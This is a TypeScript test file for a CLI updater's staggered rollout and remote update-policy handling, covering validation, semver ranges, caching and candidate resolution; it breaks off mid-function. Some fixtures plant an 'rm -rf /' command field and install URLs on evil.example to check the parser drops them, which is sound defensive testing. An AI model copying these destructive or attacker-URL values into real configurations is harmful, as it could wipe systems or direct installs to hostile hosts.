/**
 * #3619: staggered rollout + remote update-policy file.
 *
 * Coverage map (issue acceptance boxes):
 *  ① draw uniformity (fixed random source) + persistence no-re-roll  — §D, §H1
 *  ② default window 15min..48h, local config/env override            — §C
 *  ③ remote policy fetch: ETag cache, 304, failure fallback          — §E
 *  ④ overrides by version/range; hold/blocked/pinned each tested     — §C, §G, §H
 *  ⑤ security: file cannot induce arbitrary version/URL installs     — §A5, §G, §H6
 *  ⑥ docs live in CONFIGURATION.md (not testable here)
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import * as tar from "tar";
import {
    STAGGER_MIN_DELAY_DEFAULT_MS,
    STAGGER_MAX_DELAY_DEFAULT_MS,
    normalizePolicyDoc,
    parseSemverRange,
    satisfiesRange,
    resolveStaggerWindow,
    ensureStaggerDraw,
    staggerKey,
    loadUpdatePolicy,
    getUpdatePolicyState,
    getPlannedUpgrade,
    fetchPublishedVersions,
    resolveCandidateAgainstPolicy,
    resolveUpgradeCandidate,
    _resetUpdatePolicyForTest,
} from "../src/update-policy.ts";
import { parseDurationField } from "../src/duration.ts";
import { cacheDir } from "../src/paths.ts";

const MIN = 60_000;

// Isolate the cache dir BEFORE any code touches it (paths.ts reads env live).
const scratchRoot = mkdtempSync(path.join(tmpdir(), "bc-policy-scratch-"));
function freshCacheDir(): string {
    const dir = mkdtempSync(path.join(scratchRoot, "cache-"));
    process.env.XDG_CACHE_HOME = dir;
    return dir;
}
function freshConfigDir(): void {
    process.env.XDG_CONFIG_HOME = mkdtempSync(path.join(scratchRoot, "config-"));
}

// ---------------------------------------------------------------------------
// A. document validation
// ---------------------------------------------------------------------------

function doc(partial: Record<string, unknown>): unknown {
    return { schemaVersion: 1, ...partial };
}

test("normalizePolicyDoc: happy path keeps all fields and ignores unknown extras", () => {
    const { doc: d, warnings } = normalizePolicyDoc(doc({
        default: { minDelay: "1m", maxDelay: "1h" },
        overrides: [{ range: ">=0.1.200", maxDelay: "1h" }, { version: "0.1.199", maxDelay: "1m" }],
        hold: true,
        blocked: ["0.1.200"],
        pinned: "0.1.199",
        installUrl: "http://evil.example/tarball.tgz",
        tarballUrl: "http://evil.example/other.tgz",
        command: "rm -rf /",
    }));
    assert.ok(d);
    assert.deepEqual(d.defaultWindow, { minDelayMs: 60_000, maxDelayMs: 3_600_000 });
    assert.equal(d.overrides.length, 2);
    assert.equal(d.hold, true);
    assert.deepEqual(d.blocked, ["0.1.200"]);
    assert.equal(d.pinned, "0.1.199");
    // security boundary: the protocol has NO field that names a URL or command
    assert.equal((d as Record<string, unknown>).installUrl, undefined);
    assert.equal(Object.keys(d).sort().join(","), "blocked,defaultWindow,hold,overrides,pinned");
    assert.equal(warnings.length, 0);
});

test("normalizePolicyDoc: unknown or missing schemaVersion kills the whole file", () => {
    for (const raw of [{}, { schemaVersion: 2 }, { schemaVersion: "1" }, { schemaVersion: null }]) {
        const r = normalizePolicyDoc(raw);
        assert.equal(r.doc, undefined, JSON.stringify(raw));
        assert.ok(r.error);
    }
    assert.equal(normalizePolicyDoc([1, 2]).doc, undefined);
    assert.equal(normalizePolicyDoc("nope").doc, undefined);
    assert.equal(normalizePolicyDoc(null).doc, undefined);
});

test("normalizePolicyDoc: malformed sub-fields drop individually with warnings", () => {
    const { doc: d, warnings } = normalizePolicyDoc(doc({
        default: { minDelay: -5, maxDelay: "1h" },
        overrides: [
            { version: "0.1.199", range: ">=0.1.199", maxDelay: "1m" },
            { version: "0.1.198", minDelay: "1h", maxDelay: "1m" },
            { range: "not-a-range", maxDelay: "1m" },
            { maxDelay: "1m" },
            { version: "0.1.197" },
            { version: "0.1.196", maxDelay: "1m" },
        ],
        blocked: ["0.1.200", "http://evil.example/x", "garbage", "0.1.200"],
        pinned: "definitely-not-a-version",
        hold: "yes",
    }));
    assert.ok(d);
    // default.minDelayMs invalid → partial block keeps only the valid side
    assert.deepEqual(d.defaultWindow, { maxDelayMs: 3_600_000 });
    // only the last override survived
    assert.equal(d.overrides.length, 1);
    assert.equal(d.overrides[0].version, "0.1.196");
    assert.deepEqual(d.blocked, ["0.1.200"]);
    assert.equal(d.pinned, null);
    assert.equal(d.hold, false);
    assert.ok(warnings.length >= 7, `expected >=7 warnings, got ${warnings.length}: ${warnings.join(" | ")}`);
});

test("normalizePolicyDoc: delay values beyond the sanity cap are rejected", () => {
    const { doc: d } = normalizePolicyDoc(doc({ default: { minDelay: "15m", maxDelay: 1e15 } }));
    assert.ok(d);
    assert.equal(d.defaultWindow?.maxDelayMs, undefined);
});

test("normalizePolicyDoc: human-readable duration strings (\"15m\"/\"2d\"/\"1d12h\") are the preferred form (#3619)", () => {
    const { doc: d, warnings } = normalizePolicyDoc(doc({
        default: { minDelay: "15m", maxDelay: "2d" },
        overrides: [
            { range: ">=0.1.200", maxDelay: "1h30m" },
            { version: "0.1.199", minDelay: "0s" },
        ],
    }));
    assert.ok(d);
    assert.deepEqual(d.defaultWindow, { minDelayMs: 900_000, maxDelayMs: 172_800_000 });
    assert.equal(d.overrides[0].maxDelayMs, 5_400_000);
    assert.equal(d.overrides[1].minDelayMs, 0);
    assert.equal(warnings.length, 0);
});

test("normalizePolicyDoc: malformed duration strings are ignored with a warning (never guessed)", () => {
    const { doc: d, warnings } = normalizePolicyDoc(doc({
        default: { minDelay: "15q", maxDelay: "2d" },
    }));
    assert.ok(d);
    // bad min falls away, valid max survives as a partial window
    assert.deepEqual(d.defaultWindow, { maxDelayMs: 172_800_000 });
    assert.ok(warnings.some((w) => w.includes("default.minDelay")), warnings.join(" | "));
});

// ---------------------------------------------------------------------------
// B. duration parser (src/duration.ts — shared by policy file and local knobs)
// ---------------------------------------------------------------------------

test("parseDurationField: units, combinations, decimals, case, whitespace", () => {
    const cases: Array<[string, number | undefined]> = [
        ["15m", 900_000],
        ["2h", 7_200_000],
        ["48h", 172_800_000],
        ["2d", 172_800_000],
        ["1w", 604_800_000],
        ["30s", 30_000],
        ["1d12h", 129_600_000],
        ["1h30m", 5_400_000],
        ["1.5h", 5_400_000],
        ["0s", 0],
        ["15M", 900_000],        // case-insensitive (no ambiguity in the unit set)
        [" 15m ", 900_000],      // surrounding whitespace ok
    ];
    for (const [text, want] of cases) assert.equal(parseDurationField(text), want, text);
});

test("parseDurationField: rejects everything else — callers ignore, never guess", () => {
    for (const bad of ["", "   ", "100", "ms", "15q", "1d12", "m15", "-15m", "1h 30m", "1e3s", "15 m"]) {
        assert.equal(parseDurationField(bad), undefined, JSON.stringify(bad));
    }
});

// ---------------------------------------------------------------------------
// B. semver ranges
// ---------------------------------------------------------------------------

test("parseSemverRange/satisfiesRange: comparators, AND, OR, wildcards", () => {
    const cases: Array<[string, string, boolean]> = [
        [">=0.1.200", "0.1.200", true],
        [">=0.1.200", "0.1.199", false],
        [">=0.1.200 <0.1.205", "0.1.203", true],
        [">=0.1.200 <0.1.205", "0.1.205", false],
        ["0.1.199", "0.1.199", true],
        ["0.1.199", "0.1.200", false],
        ["*", "9.9.9", true],
        ["", "9.9.9", true],
        [">=0.1.199 || >=0.2.0", "0.2.1", true],
        [">=0.1.199 <0.1.200", "0.2.1", false],
        [">1.2.3", "1.2.4", true],
        ["<=1.2.3", "1.2.3", true],
        ["<1.2.3", "1.2.3", false],
    ];
    for (const [range, version, expected] of cases) {
        const r = parseSemverRange(range);
        assert.ok(r, `range ${JSON.stringify(range)} must parse`);
        assert.equal(satisfiesRange(version, r!), expected, `${version} in ${range}`);
    }
});

test("parseSemverRange: caret and tilde follow npm semantics", () => {
    const caret = parseSemverRange("^0.1.199")!;
    assert.equal(satisfiesRange("0.1.200", caret), true);
    assert.equal(satisfiesRange("0.2.0", caret), false);
    const caretZero = parseSemverRange("^0.0.5")!;
    // npm: ^0.0.5 := >=0.0.5 <0.0.6 — with major AND minor at zero the patch pins
    assert.equal(satisfiesRange("0.0.5", caretZero), true);
    assert.equal(satisfiesRange("0.0.6", caretZero), false);
    assert.equal(satisfiesRange("0.0.7", caretZero), false);
    const caretMajor = parseSemverRange("^1.2.3")!;
    assert.equal(satisfiesRange("1.9.0", caretMajor), true);
    assert.equal(satisfiesRange("2.0.0", caretMajor), false);
    const tilde = parseSemverRange("~0.1.199")!;
    assert.equal(satisfiesRange("0.1.250", tilde), true);
    assert.equal(satisfiesRange("0.2.0", tilde), false);
});

test("parseSemverRange: garbage is unparseable; prereleases need same-tuple tags", () => {
    assert.equal(parseSemverRange("banana"), undefined);
    assert.equal(parseSemverRange(">=1.x"), undefined);
    const r = parseSemverRange(">=1.0.0")!;
    assert.equal(satisfiesRange("1.5.0-beta.1", r), false);
    const tagged = parseSemverRange(">=1.5.0-beta.1")!;
    assert.equal(satisfiesRange("1.5.0-beta.2", tagged), true);
    assert.equal(satisfiesRange("1.6.0-beta.1", tagged), false);
});

// ---------------------------------------------------------------------------
// C. stagger window composition (acceptance ②)
// ---------------------------------------------------------------------------

test("resolveStaggerWindow: built-in default is 15min..48h with no policy/local", () => {
    const w = resolveStaggerWindow("0.1.200", undefined);
    assert.equal(w.minMs, STAGGER_MIN_DELAY_DEFAULT_MS);
    assert.equal(w.maxMs, STAGGER_MAX_DELAY_DEFAULT_MS);
    assert.equal(STAGGER_MIN_DELAY_DEFAULT_MS, 15 * MIN);
    assert.equal(STAGGER_MAX_DELAY_DEFAULT_MS, 48 * 3_600_000);
});

test("resolveStaggerWindow: remote default applies; local override replaces the base", () => {
    const policy = normalizePolicyDoc(doc({ default: { minDelay: 10 * MIN, maxDelay: 20 * MIN } })).doc!;
    assert.deepEqual(resolveStaggerWindow("0.1.200", policy), { minMs: 10 * MIN, maxMs: 20 * MIN });
    // local wins over the remote default (single-machine pacing preference)
    assert.deepEqual(resolveStaggerWindow("0.1.200", policy, 5 * MIN, 30 * MIN), { minMs: 5 * MIN, maxMs: 30 * MIN });
    // partial remote default merges per-field over the built-ins
    const partial = normalizePolicyDoc(doc({ default: { minDelay: 10 * MIN } })).doc!;
    assert.deepEqual(resolveStaggerWindow("0.1.200", partial), { minMs: 10 * MIN, maxMs: STAGGER_MAX_DELAY_DEFAULT_MS });
});

test("resolveStaggerWindow: overrides stack on top; exact version beats range; first range wins", () => {
    const policy = normalizePolicyDoc(doc({
        default: { minDelay: 10 * MIN, maxDelay: 20 * MIN },
        overrides: [
            { range: ">=0.1.100", maxDelay: 30 * MIN },
            { range: ">=0.1.150", minDelay: 15 * MIN },
            { version: "0.1.199", maxDelay: "1m" },
        ],
    })).doc!;
    // exact version match outranks every range; the one-sided max crosses the
    // inherited min (10min > 60s) → collapses to the tighter bound (a single point)
    assert.deepEqual(resolveStaggerWindow("0.1.199", policy), { minMs: 60_000, maxMs: 60_000 });
    // first matching range wins (both ranges match 0.1.200)
    assert.deepEqual(resolveStaggerWindow("0.1.200", policy), { minMs: 10 * MIN, maxMs: 30 * MIN });
    // single-side override composes against the base
    const oneSided = normalizePolicyDoc(doc({
        default: { minDelay: 10 * MIN, maxDelay: 20 * MIN },
        overrides: [{ version: "0.1.201", minDelay: 12 * MIN }],
    })).doc!;
    assert.deepEqual(resolveStaggerWindow("0.1.201", oneSided), { minMs: 12 * MIN, maxMs: 20 * MIN });
    // one-sided override crossing the inherited base (15min..48h + max 1min)
    // collapses to the operator's tighter bound instead of being dropped
    const crossed = normalizePolicyDoc(doc({
        overrides: [{ version: "0.1.202", maxDelay: MIN }],
    })).doc!;
    assert.deepEqual(resolveStaggerWindow("0.1.202", crossed), { minMs: MIN, maxMs: MIN });
    // local min > max also clamps to a single point at the tighter bound
    assert.deepEqual(resolveStaggerWindow("0.1.200", undefined, 48 * 3_600_000, MIN), { minMs: MIN, maxMs: MIN });
});

// ---------------------------------------------------------------------------
// D. stagger draw store (acceptance ①)
// ---------------------------------------------------------------------------

test("ensureStaggerDraw: fixed random source draws deterministically inside the window", async () => {
    freshCacheDir();
    const now = Date.now();
    const mid = await ensureStaggerDraw({ key: "latest:1.0.0", minDelayMs: 10 * MIN, maxDelayMs: 40 * MIN, now, rand: () => 0.5 });
    assert.equal(mid.drawnNow, true);
    assert.equal(mid.at, now + 10 * MIN + Math.floor(0.5 * (30 * MIN + 1)));
    const lo = await ensureStaggerDraw({ key: "latest:1.0.1", minDelayMs: 10 * MIN, maxDelayMs: 40 * MIN, now, rand: () => 0 });
    assert.equal(lo.at, now + 10 * MIN);
    const hi = await ensureStaggerDraw({ key: "latest:1.0.2", minDelayMs: 10 * MIN, maxDelayMs: 40 * MIN, now, rand: () => 0.999999 });
    assert.ok(hi.at > now + 40 * MIN - 1000 && hi.at <= now + 40 * MIN);
});

test("ensureStaggerDraw: persisted draws survive restarts — no re-roll", async () => {
    freshCacheDir();
    const now = Date.now();
    const first = await ensureStaggerDraw({ key: staggerKey("latest", "2.0.0"), minDelayMs: 10 * MIN, maxDelayMs: 40 * MIN, now, rand: () => 0.5 });
    // simulate a process restart: fresh in-memory state, same machine cache dir
    _resetUpdatePolicyForTest();
    const reRead = await ensureStaggerDraw({ key: staggerKey("latest", "2.0.0"), minDelayMs: 10 * MIN, maxDelayMs: 40 * MIN, now: now + 3_600_000, rand: () => 0 });
    assert.equal(reRead.drawnNow, false);
    assert.equal(reRead.at, first.at);
    // the file holds exactly the one draw, keyed tag:version
    const raw = JSON.parse(readFileSync(path.join(cacheDir(), ".update-stagger.json"), "utf-8")) as { v: number; draws: Record<string, number> };
    assert.equal(raw.v, 1);
    assert.deepEqual(raw.draws, { "latest:2.0.0": first.at });
});

test("ensureStaggerDraw: a 0/0 window is immediate — the machine-local legacy opt-out", async () => {
    freshCacheDir();
    const now = Date.now();
    const r = await ensureStaggerDraw({ key: "latest:4.0.0", minDelayMs: 0, maxDelayMs: 0, now, rand: () => 0.5 });
    assert.equal(r.drawnNow, true);
    assert.equal(r.at, now);
});

test("ensureStaggerDraw: stale draws (>7 days) are pruned on the next persist", async () => {
    freshCacheDir();
    const now = Date.now();
    mkdirSync(cacheDir(), { recursive: true });
    writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({
        v: 1,
        draws: { "latest:0.0.1": now - 8 * 86_400_000, "latest:9.9.9": now },
    }));
    await ensureStaggerDraw({ key: "latest:5.5.5", minDelayMs: MIN, maxDelayMs: 2 * MIN, now, rand: () => 0.5 });
    const raw = JSON.parse(readFileSync(path.join(cacheDir(), ".update-stagger.json"), "utf-8")) as { draws: Record<string, number> };
    assert.equal(raw.draws["latest:0.0.1"], undefined);
    assert.ok(raw.draws["latest:9.9.9"]);
    assert.ok(raw.draws["latest:5.5.5"]);
});

test("ensureStaggerDraw: corrupt store falls back to a fresh draw instead of throwing", async () => {
    freshCacheDir();
    mkdirSync(cacheDir(), { recursive: true });
    writeFileSync(path.join(cacheDir(), ".update-stagger.json"), "{not json");
    const r = await ensureStaggerDraw({ key: "latest:3.0.0", minDelayMs: MIN, maxDelayMs: 2 * MIN, now: Date.now(), rand: () => 0.5 });
    assert.equal(r.drawnNow, true);
});

// ---------------------------------------------------------------------------
// E. remote policy fetch: ETag cache + fail-open ladder (acceptance ③)
// ---------------------------------------------------------------------------

type FetchCall = { url: string; headers: Record<string, string> };
function mockFetch(handler: (call: FetchCall) => Response | Promise<Response>): () => void {
    const calls: FetchCall[] = [];
    const original = globalThis.fetch;
    globalThis.fetch = (async (input: string | URL, init?: RequestInit) => {
        const url = typeof input === "string" ? input : input.toString();
        const headers: Record<string, string> = {};
        const h = (init?.headers ?? {}) as Record<string, string>;
        for (const [k, v] of Object.entries(h)) headers[k.toLowerCase()] = String(v);
        calls.push({ url, headers });
        return handler({ url, headers });
    }) as typeof fetch;
    return () => {
        globalThis.fetch = original;
    };
}

const GOOD_POLICY = JSON.stringify(doc({ default: { minDelay: "1m", maxDelay: 2 * MIN } }));

test("loadUpdatePolicy: 200 caches with ETag; next call sends If-None-Match; 304 keeps the doc", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(({ headers }) => {
        if (headers["if-none-match"] === "etag-1") return new Response(null, { status: 304 });
        return new Response(GOOD_POLICY, { status: 200, headers: { ETag: "etag-1" } });
    });
    try {
        const first = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(first.source, "remote");
        assert.ok(first.doc);
        assert.equal(first.doc!.defaultWindow?.minDelayMs, MIN);
        const cached = JSON.parse(readFileSync(path.join(cacheDir(), ".update-policy.json"), "utf-8")) as { etag?: string; body: string; fetchedAt: number };
        assert.equal(cached.etag, "etag-1");
        assert.equal(cached.body, GOOD_POLICY);

        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(second.source, "remote");
        assert.equal(second.fetchedAt, first.fetchedAt);
        assert.ok(second.doc);
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: changed ETag replaces the cached doc", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    let etagSeen: string | undefined;
    const restore = mockFetch(({ headers }) => {
        etagSeen = headers["if-none-match"];
        return new Response(JSON.stringify(doc({ hold: true })), { status: 200, headers: { ETag: "etag-2" } });
    });
    try {
        await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(etagSeen, undefined);
        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(etagSeen, "etag-2");
        assert.equal(second.doc?.hold, true);
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: malformed JSON drops the cache and falls back to local defaults", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    let stage = 0;
    const restore = mockFetch(() => {
        stage++;
        if (stage === 1) return new Response(GOOD_POLICY, { status: 200, headers: { ETag: "e1" } });
        return new Response("{broken", { status: 200 });
    });
    try {
        const ok = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(ok.source, "remote");
        assert.equal(ok.doc?.hold, false);
        const bad = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(bad.source, "local-default");
        assert.equal(bad.doc, undefined);
        assert.ok(bad.error);
        assert.equal(existsSync(path.join(cacheDir(), ".update-policy.json")), false, "the stale cache entry must be dropped with the body that produced it");
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: unknown schemaVersion is treated as malformed (file ignored)", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => new Response(JSON.stringify({ schemaVersion: 99, hold: true }), { status: 200 }));
    try {
        const st = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(st.source, "local-default");
        assert.equal(st.doc, undefined);
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: network failure with a good cache keeps the brake alive (stale-cache)", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    let fail = false;
    const restore = mockFetch(() => {
        if (fail) throw new Error("network down");
        return new Response(JSON.stringify(doc({ hold: true })), { status: 200, headers: { ETag: "e1" } });
    });
    try {
        const first = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(first.doc?.hold, true);
        fail = true;
        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(second.source, "stale-cache");
        assert.equal(second.doc?.hold, true);
        assert.ok(second.error);
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: network failure without cache (or with a >30d-old cache) → local defaults", async () => {
    const cache = freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => {
        throw new Error("network down");
    });
    try {
        const cold = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(cold.source, "local-default");
        assert.equal(cold.doc, undefined);

        mkdirSync(cache, { recursive: true });
        writeFileSync(path.join(cache, ".update-policy.json"), JSON.stringify({
            v: 1, etag: "old", fetchedAt: Date.now() - 31 * 86_400_000, body: GOOD_POLICY,
        }));
        const staleBeyondCap = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(staleBeyondCap.source, "local-default");
        assert.equal(staleBeyondCap.doc, undefined);
    } finally {
        restore();
    }
});

test("loadUpdatePolicy: HTTP error status fails open like a network error", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => new Response("nope", { status: 500 }));
    try {
        const st = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        assert.equal(st.source, "local-default");
        assert.match(st.error ?? "", /HTTP 500/);
    } finally {
        restore();
    }
});

test("getUpdatePolicyState/getPlannedUpgrade mirror what the gate last computed", async () => {
    freshCacheDir();
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => new Response(JSON.stringify(doc({ hold: true, pinned: "1.2.3" })), { status: 200 }));
    try {
        await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
        const st = getUpdatePolicyState()!;
        assert.equal(st.doc?.hold, true);
        assert.equal(st.doc?.pinned, "1.2.3");
        assert.equal(getPlannedUpgrade(), undefined);
    } finally {
        restore();
    }
});

// ---------------------------------------------------------------------------
// F. published-version list
// ---------------------------------------------------------------------------

test("fetchPublishedVersions: parses the packument, filters to strict semver, TTL-caches", async () => {
    freshConfigDir();
    _resetUpdatePolicyForTest();
    let calls = 0;
    const restore = mockFetch(() => {
        calls++;
        return new Response(JSON.stringify({ versions: { "1.0.0": {}, "1.0.1": {}, "v2.0.0": {}, "latest": {}, "banana": {} } }), { status: 200 });
    });
    try {
        const list = await fetchPublishedVersions({ url: "http://registry.test/pkg" });
        assert.deepEqual(list, ["1.0.0", "1.0.1"]);
        await fetchPublishedVersions({ url: "http://registry.test/pkg" });
        assert.equal(calls, 1);
    } finally {
        restore();
    }
});

test("fetchPublishedVersions: HTTP failure → undefined (callers defer)", async () => {
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => new Response("err", { status: 500 }));
    try {
        assert.equal(await fetchPublishedVersions({ url: "http://registry.test/pkg" }), undefined);
    } finally {
        restore();
    }
});

// ---------------------------------------------------------------------------
// G. candidate resolution: pin ceiling / blocked stepping (acceptance ④⑤)
// ---------------------------------------------------------------------------

const PUB = ["1.2.3", "1.2.4", "1.2.5"];

test("resolveCandidateAgainstPolicy: pin is a ceiling, never a downgrade", () => {
    const base = { currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB };
    // no controls → highest published newer version
    assert.deepEqual(resolveCandidateAgainstPolicy({ ...base, doc: { defaultWindow: undefined, overrides: [], hold: false, blocked: [], pinned: null } }), { kind: "proceed", candidate: "1.2.5" });
    // pin below latest → ceiling selects 1.2.4
    assert.deepEqual(
        resolveCandidateAlreadyValidated({ currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB, pinned: "1.2.4" }),
        { kind: "proceed", candidate: "1.2.4" },
    );
    // pin AT current → nothing to install (no downgrade)
    assert.equal(resolveCandidateAlreadyValidated({ currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB, pinned: "1.2.3" }).kind, "none");
    // instance already ABOVE the pin → stays put
    assert.equal(resolveCandidateAlreadyValidated({ currentVersion: "1.2.5", latest: "1.2.5", publishedVersions: PUB, pinned: "1.2.4" }).kind, "none");
});

function resolveCandidateAlreadyValidated(args: { currentVersion: string; latest: string; publishedVersions: readonly string[]; pinned: string | null; blocked?: string[] }) {
    return resolveCandidateAgainstPolicy({
        currentVersion: args.currentVersion,
        latest: args.latest,
        publishedVersions: args.publishedVersions,
        doc: { defaultWindow: undefined, overrides: [], hold: false, blocked: args.blocked ?? [], pinned: args.pinned },
    });
}

test("resolveCandidateAgainstPolicy: unpublished pin/blocked values are dropped (security boundary)", () => {
    // pin naming a version the registry never published → pin ignored entirely
    assert.deepEqual(
        resolveCandidateAlreadyValidated({ currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB, pinned: "9.9.9" }),
        { kind: "proceed", candidate: "1.2.5" },
    );
    // blocked naming garbage → ignored; the real block still steps down
    assert.deepEqual(
        resolveCandidateAlreadyValidated({ currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB, pinned: null, blocked: ["http://evil.example/x", "1.2.5"] }),
        { kind: "proceed", candidate: "1.2.4" },
    );
    // blocking everything newer → honest "none", not a silent fall-through to latest
    assert.equal(
        resolveCandidateAlreadyValidated({ currentVersion: "1.2.3", latest: "1.2.5", publishedVersions: PUB, pinned: null, blocked: ["1.2.4", "1.2.5"] }).kind,
        "none",
    );
});

test("resolveUpgradeCandidate: defers when the packument is unreachable; passes through without controls", async () => {
    freshConfigDir();
    _resetUpdatePolicyForTest();
    const restore = mockFetch(() => {
        throw new Error("registry down");
    });
    try {
        const deferred = await resolveUpgradeCandidate({
            currentVersion: "1.2.3", latest: "1.2.5",
            doc: { defaultWindow: undefined, overrides: [], hold: false, blocked: ["1.2.5"], pinned: null },
            packumentUrl: "http://registry.test/billion-context",
        });
        assert.equal(deferred.kind, "deferred");
    } finally {
        restore();
    }
    // no active controls → no packument fetch needed at all
    const passthrough = await resolveUpgradeCandidate({
        currentVersion: "1.2.3", latest: "1.2.5",
        doc: { defaultWindow: undefined, overrides: [], hold: false, blocked: [], pinned: null },
        packumentUrl: "http://registry.test/billion-context",
    });
    assert.deepEqual(passthrough, { kind: "proceed", candidate: "1.2.5" });
});

// ---------------------------------------------------------------------------
// H. end-to-end through checkForUpdate (real install into a temp dir)
// ---------------------------------------------------------------------------

// BILI_UPDATE_REGISTRY is read ONCE at update.ts import time — set it before
// the first dynamic import below, while the rest of the env stays clean.
process.env.BILI_UPDATE_REGISTRY = "http://registry.test";

type UpdateModule = typeof import("../src/update.ts");
let updateMod: UpdateModule | undefined;
async function getUpdateModule(): Promise<UpdateModule> {
    if (!updateMod) {
        freshConfigDir();
        updateMod = await import("../src/update.ts");
    }
    return updateMod;
}

function integrityField(buf: Buffer, alg = "sha512"): string {
    return `${alg}-${crypto.createHash(alg).update(buf).digest("base64")}`;
}

interface Harness {
    root: string;
    installDir: string;
    diskVersion(): string;
    reset(): void;
}

function writeBiliPackage(dir: string, version: string): void {
    mkdirSync(path.join(dir, "dist"), { recursive: true });
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({
        name: "billion-context", version, type: "module", main: "dist/index.js", bin: { bili: "./dist/index.js" },
    }));
    writeFileSync(path.join(dir, "dist", "index.js"), `export const loaded = '${version}';\n`);
}

function makeHarness(): Harness {
    const root = mkdtempSync(path.join(tmpdir(), "bc-policy-e2e-"));
    const installDir = path.join(root, "install");
    writeBiliPackage(installDir, "1.2.3");
    return {
        root,
        installDir,
        diskVersion() {
            return (JSON.parse(readFileSync(path.join(installDir, "package.json"), "utf-8")) as { version: string }).version;
        },
        reset() {
            writeBiliPackage(installDir, "1.2.3");
        },
    };
}

/** Route registry + policy + tarball URLs to hermetic fixtures. */
function mockRegistry(opts: {
    latestVersion: string;
    published: string[];
    policyBody?: string | (() => string);
    policyFail?: boolean;
}): { restore: () => void; hits: string[] } {
    const hits: string[] = [];
    const original = globalThis.fetch;
    const tarballs = new Map<string, { tgz: Buffer; integrity: string }>();
    globalThis.fetch = (async (input: string | URL, init?: RequestInit) => {
        const url = typeof input === "string" ? input : input.toString();
        hits.push(url);
        if (url.startsWith("http://policy.test/")) {
            if (opts.policyFail) throw new Error("policy source unreachable");
            const body = typeof opts.policyBody === "function" ? opts.policyBody() : (opts.policyBody ?? JSON.stringify({ schemaVersion: 1 }));
            return new Response(body, { status: 200, headers: { "content-type": "application/json" } });
        }
        if (url === "http://registry.test/billion-context") {
            const versions: Record<string, object> = {};
            for (const v of opts.published) versions[v] = {};
            return new Response(JSON.stringify({ name: "billion-context", versions, distTags: { latest: opts.latestVersion } }), { status: 200 });
        }
        const m = url.match(/^http:\/\/registry\.test\/billion-context\/([^/]+)$/);
        if (m) {
            const version = decodeURIComponent(m[1]);
            if (version === opts.latestVersion || version === "latest") {
                // the dist-tag doc always describes the latest published version
                const { integrity } = makeHarnessTarball(tarballs, opts.latestVersion);
                return new Response(JSON.stringify({
                    name: "billion-context", version: opts.latestVersion,
                    dist: { tarball: `http://registry.test/tar/${opts.latestVersion}.tgz`, integrity },
                }), { status: 200 });
            }
            if (opts.published.includes(version)) {
                const { integrity } = makeHarnessTarball(tarballs, version);
                return new Response(JSON.stringify({
                    name: "billion-context", version,
                    dist: { tarball: `http://registry.test/tar/${version}.tgz`, integrity },
                }), { status: 200 });
            }
            return new Response("not found", { status: 404 });
        }
        const tm = url.match(/^http:\/\/registry\.test\/tar\/(.+)\.tgz$/);
        if (tm) {
            const version = decodeURIComponent(tm[1]);
            const entry = makeHarnessTarball(tarballs, version);
            return new Response(entry.tgz, { status: 200 });
        }
        if (url.startsWith("http://evil.")) {
            return new Response("you must never be here", { status: 200 });
        }
        return new Response(`unexpected URL ${url}`, { status: 404 });
    }) as typeof fetch;
    return {
        restore() {
            globalThis.fetch = original;
        },
        hits,
    };
}

// tarballs are built lazily per version in a shared scratch root
let tarScratch: string | undefined;
function makeHarnessTarball(store: Map<string, { tgz: Buffer; integrity: string }>, version: string): { tgz: Buffer; integrity: string } {
    const hit = store.get(version);
    if (hit) return hit;
    tarScratch ??= mkdtempSync(path.join(tmpdir(), "bc-policy-tar-"));
    const src = path.join(tarScratch, `pkg-${version}`);
    mkdirSync(path.join(src, "package", "dist"), { recursive: true });
    writeFileSync(path.join(src, "package", "package.json"), JSON.stringify({
        name: "billion-context", version, type: "module", main: "dist/index.js", bin: { bili: "./dist/index.js" },
    }));
    writeFileSync(path.join(src, "package", "dist", "index.js"), `export const loaded = '${version}';\n`);
    const tgzPath = path.join(tarScratch, `pkg-${version}.tgz`);
    tar.c({ cwd: src, file: tgzPath, gzip: true, sync: true }, ["package"]);
